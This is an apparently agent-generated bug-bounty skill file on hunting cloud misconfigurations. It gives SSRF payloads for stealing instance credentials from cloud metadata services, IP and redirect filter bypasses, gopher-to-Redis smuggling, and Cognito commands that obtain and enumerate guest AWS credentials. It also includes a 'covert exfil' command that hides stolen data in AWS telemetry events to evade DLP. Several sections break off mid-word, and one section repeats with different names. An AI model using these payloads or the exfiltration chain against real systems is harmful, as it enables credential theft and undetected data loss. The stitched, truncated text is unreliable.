---
name: bbhunt-cloud-misconfig
description: "Hunt IAM over-permission, public storage, metadata exposure and infrastructure-as-code mistakes. Unified from 3 upstream skills (cbh, hunting, research). For authorized security testing only."
agent_created: true
---

# Cloud misconfiguration hunting — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, hunting, research. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### A. Discovery checklist — concrete places, params, headers, infra signals to look

- OWASP Top 10:2025 moved Security Misconfiguration to A02 — cloud storage/identity permissions and exposed default content are explicitly in scope. Prioritize findings that yield data read, write, or credentials over checklist noise.
- SSRF-capable parameters first: `url`, `uri`, `path`, `dest`, `destination`, `redirect`, `feed`, `image_url`, `webhook`, `callback`, `pdf`/`render` URLs, file imports, link previews. Any server-side fetcher is an IMDS candidate.
- Fingerprint the cloud from headers/banners and asset data: `Server: awselb/2.0`, `X-Amzn-Trace-Id`, `x-goog-*`, `Azure`, `X-Nf-*`, `CF-*`. Determine whether the workload is AWS EC2/ECS/Lambda, GCP, or Azure before choosing metadata endpoints.
- Metadata endpoints to probe via the fetcher:
  - AWS IMDS: `http://169.254.169.254/latest/meta-data/`, `.../iam/security-credentials/`, `.../user-data`, IPv6 `[fd00:ec2::254]`
  - GCP: `http://metadata.google.internal/computeMetadata/v1/` (requires `Metadata-Flavor: Google`)
  - Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true`)
- Determine IMDS version from response shape. IMDSv1 answers plain GETs with no token; IMDSv2 requires `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds` and then the token header. Datadog's 2025 study still finds instances allowing both, and flags the attack path "public EC2 running IMDSv1 + SSRF."
- Storage exposure sweep: public S3/GCS/Azure Blob listing, permissive bucket/container policies (publi

### Techniques, payloads and bypasses

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- Classic IMDSv1 SSRF chain:
  ```
  GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/
  GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
  GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>/
  ```
  Returns `AccessKeyId`, `SecretAccessKey`, `SessionToken` — export to AWS CLI and enumerate privileges (`aws sts get-caller-identity`, pacu, enumerate-iam.py). A 404 at `/iam/` means no role; 200-empty means a revoked role.
- IMDSv2 bypass conditions to test (rare but real): SSRF that allows arbitrary method + headers (e.g. CRLF injection, gopher:// to Redis/HTTP, redirect-based method/header smuggling), or a proxy that adds `X-aws-ec2-metadata-token` itself. Otherwise treat IMDSv2 as a blocker. Note IMDSv2 also drops requests carrying `X-Forwarded-For` for token fetches and enforces an IP hop-count limit.
- Blind/OOB variants: point the fetcher at a Collaborator/interactsh domain to prove outbound requests; use `gopher://` for protocol smuggling to internal Redis (unauthenticated -> RCE) or SMTP; DNS rebinding to defeat IP blocklists; redirect chains (`302` to `169.254.169.254`) when direct literals are filtered.
- Redirect/allowlist bypasses for the URL parameter: decimal/octal/hex IP forms, `0x7f000001`, `2130706433`, `[::ffff:127.0.0.1]`, `169.254.169.254.nip.io`, `@`-userinfo, `#`/`?` fragments, trailing dots, and DNS rebinding.
- Abusing Cognito Identity Pools from leaked JS: `GetId` -> `GetCredentialsForIdentity` 

### Validation and proof

### Validation checklist (before reporting)

1. Extract `identityPoolId` from page source.
2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
3. Confirm `get-credentials-for-identity` returns STS creds.
4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
5. Run `enumerate-iam` / Pacu `iam__enum_permissions` — capture **at least one allowed action beyond `rum:PutRumEvents`**. Without this, the finding is Informational.
6. Demonstrate at least one read/list against a real resource (S3 bucket list, DynamoDB scan, Lambda invoke).
7. **Do not** modify/delete data even if permitted — read-only PoC only.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- A metadata URL reflecting in an error message is not credential theft. You must retrieve actual `AccessKeyId`/`SecretAccessKey`/`SessionToken` (or GCP/Azure equivalents) and prove they are valid (`aws sts get-caller-identity`).
- Confirm the SSRF is truly server-side: use a unique Collaborator domain and verify the DNS/HTTP callback originates from the target's infrastructure. Client-side redirects or browser fetches do not count.
- A public bucket listing empty objects is Low; a listing with sensitive data or a public-write ACL enabling arbitrary content is High/Critical. Show a concrete read/write, not just status codes.
- IMDSv2 presence: do not claim "IMDS exposure" if the token handshake blocks you. Document the headers/method you cannot control and move on — or chain with a real header-control primitive.
- When credentials are retrieved, stop at `get-caller-identity` and a minimal read demonstration; do not pivot broadly into the victim account. Rotate/purge any test artifacts and report the exact exposure window.
- Distinguish "metadata service reachable" from "role attached." A 200 at `/iam/` with an empty body means no usable credentials — not a finding.
- For RUM/Cognito chains, prove the guest role actually grants a sensitive action (e.g. S3 read, `sts:AssumeRole`) before claiming impact.

- Check the IMDS hop limit: IMDSv2 drops packets with IP TTL 1 at the instance. If the SSRF fetcher is a proxy one hop away, even a valid token may fail — note this when triaging "IMDS unreachable."
- F

### Escalation and related chains

### Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

Without those env vars, `aws s3 cp/sync` fails with `InvalidRequest`. Document this for the team. See `docs/verification/phase2j-cloud-localstack.md` for the full reproducible flow.

---

### Attack chains

**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request
# → STS creds; export and:
aws sts get-caller-identity        # confirm role
aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
# Automate: pacu / enumerate-iam.py
```

Full chain documented in `cloud-iam-deep` → Cognito Identity Pool unauthenticated chain. RUM is one common embedding context.

**Chain B — Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an **AWS-owned domain on every enterprise allowlist**. The `PutRumEvents` payload accepts arbitrary `userDetails` and `customEvents` string fields:

```bash
aws rum put-rum-events \
  --id $(uuidgen) \
  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
  --region us-east-1
```

Defenders watching egress see traffic to a known-good AWS hostname; DLP doesn't parse the JSON body; SIEM rules typical

### Related Skills & Chains

- **`subdomain-takeover`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `subdomain-takeover` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.

### Related Skills & Chains

- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`cloud-iam-deep`** — A leaked SA JSON / AWS key in a public bucket is only half the bug. Chain primitive: Public S3 + leaked AWS key in `.env` → `cloud-iam-deep` enumeration → cross-service `iam:PassRole` escalation.
- **`hunt-ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.

## Source skills merged into this topic

- `hunting` — `cloud-misconfig`
- `research` — `hunt-cloud-misconfig`
- `cbh` — `hunt-cloud-misconfig`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `bbhunt-methodology` — orchestrator, state machine and class router
